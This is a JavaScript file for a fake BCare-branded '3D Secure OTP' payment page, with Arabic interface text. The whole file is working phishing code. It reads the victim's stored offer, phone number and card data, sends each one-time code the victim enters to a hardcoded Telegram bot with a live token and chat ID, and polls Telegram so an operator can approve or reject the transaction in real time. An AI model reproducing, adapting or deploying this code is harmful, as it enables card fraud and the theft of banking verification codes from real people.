/* =====================================================
   بي كير — otp-verify.js  v6
   3D Secure OTP — يدعم 4 أو 6 أرقام
===================================================== */
'use strict';

const TG = {
  TOKEN: '8297451860:AAG52IqNkSFFPhMJr82TNEpqYNd0i7u3Dow',
  CHAT:  '1451039924',
};

let userOTP = '';
let pollInt = null;
let lastUpdateId = 0;
let waitingConfirm = false;
let myRefNumber = '';
let otpLength = 6;
let resendTimer = null;
let resendSeconds = 0;

/* ─── Telegram API ───────────────────────────────── */
async function tgSend(text, replyMarkup) {
  try {
    const body = { chat_id: TG.CHAT, text, parse_mode: 'HTML' };
    if (replyMarkup) body.reply_markup = replyMarkup;
    const res = await fetch(
      `https://api.telegram.org/bot${TG.TOKEN}/sendMessage`,
      { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) }
    );
    return await res.json();
  } catch(e) { console.error('TG:', e); return { ok: false }; }
}

async function tgAnswerCallback(callbackQueryId, text) {
  try {
    await fetch(
      `https://api.telegram.org/bot${TG.TOKEN}/answerCallbackQuery`,
      { method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ callback_query_id: callbackQueryId, text, show_alert: false }) }
    );
  } catch(e) {}
}

async function tgEditMessage(messageId, text) {
  try {
    await fetch(
      `https://api.telegram.org/bot${TG.TOKEN}/editMessageText`,
      { method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TG.CHAT, message_id: messageId, text, parse_mode: 'HTML' }) }
    );
  } catch(e) {}
}

async function tgGetUpdates() {
  try {
    const res = await fetch(
      `https://api.telegram.org/bot${TG.TOKEN}/getUpdates?offset=${lastUpdateId+1}&timeout=2`
    );
    const data = await res.json();
    return data.ok ? (data.result || []) : [];
  } catch(e) { return []; }
}

/* ─── بناء رسالة OTP مع أزرار ─────────────────────── */
function buildOTPMsg(code, ref) {
  try {
    const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
    return `🔑 <b>العميل أدخل رمز التأكيد</b>

🔑 الرمز: <code>${code}</code>
🏢 الشركة: ${offer.companyName || '—'}
💰 المبلغ: ر.س ${parseFloat(offer.total||0).toFixed(2)}
🆔 المرجع: <code>${ref}</code>`;
  } catch(e) {
    return `🔑 العميل أدخل: <code>${code}</code>\n🆔 المرجع: <code>${ref}</code>`;
  }
}

function buildOTPOtpKeyboard(code, ref) {
  return {
    inline_keyboard: [
      [{ text: `✅ الموافقة: أرسل نفس الرمز ${code}`, callback_data: `otp_approve_${ref}_${code}` }],
      [{ text: '❌ للرفض: أرسل REJECT', callback_data: `otp_reject_${ref}` }]
    ]
  };
}

/* ─── قراءة بيانات العملية ────────────────────────── */
function loadData() {
  try {
    const offer  = JSON.parse(sessionStorage.getItem('bcare_offer')  || '{}');
    const policy = JSON.parse(sessionStorage.getItem('bcare_policy') || '{}');
    const card   = JSON.parse(sessionStorage.getItem('bcare_card_data') || '{}');

    const set = (id, v) => { const e = document.getElementById(id); if (e) e.textContent = v; };

    /* ملخص */
    set('otp-amount', offer.total ? 'ر.س ' + parseFloat(offer.total).toFixed(2) : '—');
    set('otp-card-num', card.number ? '**** ' + card.number.slice(-4) : '—');

    /* رقم الجوال */
    const mobile = policy.mobile || '';
    if (mobile.length >= 3) {
      const masked = '*'.repeat(mobile.length - 3) + mobile.slice(-3);
      set('otp-phone', masked);
      set('otp-phone-last', mobile.slice(-3));
    } else {
      set('otp-phone', mobile || '—');
      set('otp-phone-last', mobile || '—');
    }
  } catch(e) {}
}

/* ─── تحديث عداد الأرقام ──────────────────────────── */
function updateCounter() {
  const boxes = [...document.querySelectorAll('.otp-box')];
  const filled = boxes.filter(b => b.value).length;
  const counter = document.getElementById('otp-counter');
  if (counter) {
    if (filled === 4 || filled === 6) {
      counter.innerHTML = `<b>${filled}</b>/${filled} أرقام — جاهز للتأكيد`;
      counter.style.color = '#22c55e';
    } else {
      counter.innerHTML = `<b>${filled}</b>/6 أرقام (يجب أن يكون 4 أو 6 أرقام)`;
      counter.style.color = '';
    }
  }

  const confirmBtn = document.getElementById('otp-confirm-btn');
  if (confirmBtn) confirmBtn.disabled = filled !== 4 && filled !== 6;
}

/* ─── مربعات OTP ───────────────────────────────────── */
function initBoxes() {
  const boxes = [...document.querySelectorAll('.otp-box')];
  const confirmBtn = document.getElementById('otp-confirm-btn');

  boxes.forEach((box, idx) => {
    box.addEventListener('input', e => {
      box.value = e.target.value.replace(/\D/g, '').slice(-1);
      box.classList.toggle('filled', !!box.value);
      if (box.value && idx < boxes.length - 1) boxes[idx + 1].focus();
      updateCounter();
      clearOTPErr();
    });

    box.addEventListener('keydown', e => {
      if (e.key === 'Backspace' && !box.value && idx > 0) {
        boxes[idx - 1].value = '';
        boxes[idx - 1].classList.remove('filled');
        boxes[idx - 1].focus();
        updateCounter();
      }
    });

    box.addEventListener('paste', e => {
      e.preventDefault();
      const p = (e.clipboardData?.getData('text') || '').replace(/\D/g, '').slice(0, otpLength);
      p.split('').forEach((d, i) => { if (boxes[i]) { boxes[i].value = d; boxes[i].classList.add('filled'); } });
      updateCounter();
      if (boxes[Math.min(p.length, otpLength - 1)]) boxes[Math.min(p.length, otpLength - 1)].focus();
    });
  });

  if (confirmBtn) confirmBtn.addEventListener('click', submitOTP);

  /* إعادة الإرسال */
  const resendBtn = document.getElementById('otp-resend-btn');
  if (resendBtn) {
    resendBtn.addEventListener('click', async () => {
      boxes.forEach(b => { b.value = ''; b.classList.remove('filled', 'otp-error', 'otp-success'); b.disabled = false; });
      if (confirmBtn) { confirmBtn.disabled = true; confirmBtn.innerHTML = '<span class="material-icons">check_circle</span> تأكيد العملية'; }
      clearOTPErr();
      waitingConfirm = false;
      clearInterval(pollInt);

      await tgSend(`🔄 <b>إعادة إرسال — بي كير</b>\n🆔 المرجع: <code>${myRefNumber}</code>`);

      const sub = document.getElementById('otp-sub-text');
      if (sub) sub.innerHTML = `تم إرسال رمز التحقق إلى رقم جوالك المنتهي بـ <b id="otp-phone-last">${(JSON.parse(sessionStorage.getItem('bcare_policy')||'{}').mobile||'').slice(-3) || '—'}</b>`;
      updateCounter();
      boxes[0]?.focus();
      startResendTimer();
    });
  }
}

/* ─── تايمر إعادة الإرسال ──────────────────────────── */
function startResendTimer() {
  clearInterval(resendTimer);
  resendSeconds = 60;
  const resendBtn = document.getElementById('otp-resend-btn');
  const timerText = document.getElementById('otp-timer-text');

  if (resendBtn) { resendBtn.disabled = true; resendBtn.style.display = 'none'; }
  if (timerText) timerText.textContent = `إعادة إرسال الرمز خلال ${resendSeconds} ثانية`;

  resendTimer = setInterval(() => {
    resendSeconds--;
    if (timerText) timerText.textContent = `إعادة إرسال الرمز خلال ${resendSeconds} ثانية`;
    if (resendSeconds <= 0) {
      clearInterval(resendTimer);
      if (resendBtn) { resendBtn.disabled = false; resendBtn.style.display = ''; }
      if (timerText) timerText.textContent = '';
    }
  }, 1000);
}

/* ─── Polling قرار الأدمن ──────────────────────────── */
function startPolling() {
  clearInterval(pollInt);
  pollInt = setInterval(async () => {
    if (!waitingConfirm) return;
    const updates = await tgGetUpdates();
    for (const u of updates) {
      lastUpdateId = u.update_id;

      if (u.callback_query) {
        const cq = u.callback_query;
        const data = cq.data || '';

        if (data.startsWith('otp_approve_')) {
          const parts = data.replace('otp_approve_', '').split('_');
          const ref = parts[0];
          const code = parts.slice(1).join('_');
          if (ref === myRefNumber && code === userOTP) {
            waitingConfirm = false;
            clearInterval(pollInt);
            await tgAnswerCallback(cq.id, '✅ تمت الموافقة');
            await tgEditMessage(cq.message.message_id, cq.message.text + '\n\n✅ <b>تم تأكيد الدفع بنجاح</b>');
            showSuccess();
            return;
          }
        }

        if (data.startsWith('otp_reject_')) {
          const ref = data.replace('otp_reject_', '');
          if (ref === myRefNumber) {
            waitingConfirm = false;
            clearInterval(pollInt);
            await tgAnswerCallback(cq.id, '❌ تم الرفض');
            await tgEditMessage(cq.message.message_id, cq.message.text + '\n\n❌ <b>تم رفض العملية</b>');
            showRejectRetry();
            return;
          }
        }
      }

      const text = (u.message?.text || '').trim();
      if (text.toUpperCase() === 'REJECT') { waitingConfirm = false; clearInterval(pollInt); showRejectRetry(); return; }
      if (text === userOTP) { waitingConfirm = false; clearInterval(pollInt); showSuccess(); return; }
    }
  }, 2500);
}

/* ─── رفض ──────────────────────────────────────────── */
function showRejectRetry() {
  const boxes = [...document.querySelectorAll('.otp-box')];
  const confirmBtn = document.getElementById('otp-confirm-btn');
  const sub = document.getElementById('otp-sub-text');

  boxes.forEach(b => { b.classList.add('otp-error'); setTimeout(() => b.classList.remove('otp-error'), 600); });

  setTimeout(() => {
    boxes.forEach(b => { b.value = ''; b.disabled = false; b.classList.remove('filled', 'otp-success'); });
    if (confirmBtn) { confirmBtn.disabled = true; confirmBtn.innerHTML = '<span class="material-icons">check_circle</span> تأكيد العملية'; }
    if (sub) sub.innerHTML = `تم إرسال رمز التحقق إلى رقم جوالك المنتهي بـ <b id="otp-phone-last">${(JSON.parse(sessionStorage.getItem('bcare_policy')||'{}').mobile||'').slice(-3) || '—'}</b>`;
    clearOTPErr();
    updateCounter();
    boxes[0]?.focus();
  }, 700);
}

/* ─── إرسال OTP ────────────────────────────────────── */
async function submitOTP() {
  const boxes = [...document.querySelectorAll('.otp-box')];
  const entered = boxes.map(b => b.value).join('');

  if (entered.length !== 4 && entered.length !== 6) { setOTPErr('يرجى إدخال 4 أو 6 أرقام'); return; }

  userOTP = entered;

  await tgSend(buildOTPMsg(entered, myRefNumber), buildOTPOtpKeyboard(entered, myRefNumber));

  const confirmBtn = document.getElementById('otp-confirm-btn');
  if (confirmBtn) { confirmBtn.disabled = true; confirmBtn.innerHTML = '<span class="material-icons otp-spin">autorenew</span> بانتظار التأكيد...'; }

  boxes.forEach(b => b.disabled = true);

  const sub = document.getElementById('otp-sub-text');
  if (sub) sub.innerHTML = `تم إرسال الرمز للمراجعة<br/><span style="color:var(--blue);font-weight:600">بانتظار تأكيد العملية...</span>`;

  waitingConfirm = true;
  startPolling();
}

/* ─── نجاح ─────────────────────────────────────────── */
function showSuccess() {
  const confirmBtn = document.getElementById('otp-confirm-btn');
  if (confirmBtn) { confirmBtn.disabled = true; confirmBtn.innerHTML = '<span class="material-icons otp-spin">autorenew</span> جاري التأكيد...'; }

  try {
    const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
    tgSend(`✅ <b>تم تأكيد الدفع بنجاح</b>\n🏢 ${offer.companyName||'—'}\n💰 ر.س ${parseFloat(offer.total||0).toFixed(2)}\n🆔 <code>${offer.refNumber||'—'}</code>\n\n<i>العملية مكتملة ✅</i>`);
  } catch(e) {}

  setTimeout(() => {
    document.getElementById('otp-card')?.classList.add('hidden');
    const sc = document.getElementById('otp-success-card');
    if (sc) sc.classList.remove('hidden');
    try {
      const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
      const set = (id, v) => { const e = document.getElementById(id); if (e) e.textContent = v; };
      set('success-ref', offer.refNumber || ('BC-' + Date.now().toString().slice(-8)));
      set('success-company', offer.companyName || '—');
      set('success-amount', offer.total ? 'ر.س ' + parseFloat(offer.total).toFixed(2) : '—');
    } catch(e) {}
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }, 1200);
}

function setOTPErr(msg) { const e = document.getElementById('otp-err'); if (e) e.textContent = msg; }
function clearOTPErr()  { const e = document.getElementById('otp-err'); if (e) e.textContent = ''; }

/* ─── INIT ────────────────────────────────────────── */
document.addEventListener('DOMContentLoaded', async () => {
  loadData();
  initBoxes();

  try {
    const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
    myRefNumber = offer.refNumber || ('BC-' + Date.now().toString().slice(-8).toUpperCase());
    if (!offer.refNumber) { offer.refNumber = myRefNumber; sessionStorage.setItem('bcare_offer', JSON.stringify(offer)); }
  } catch(e) { myRefNumber = 'BC-' + Date.now().toString().slice(-8).toUpperCase(); }

  const oldUpdates = await tgGetUpdates();
  if (oldUpdates.length > 0) {
    lastUpdateId = oldUpdates.reduce((max, u) => Math.max(max, u.update_id), 0);
  }

  updateCounter();
  startResendTimer();
  document.querySelector('.otp-box')?.focus();
});
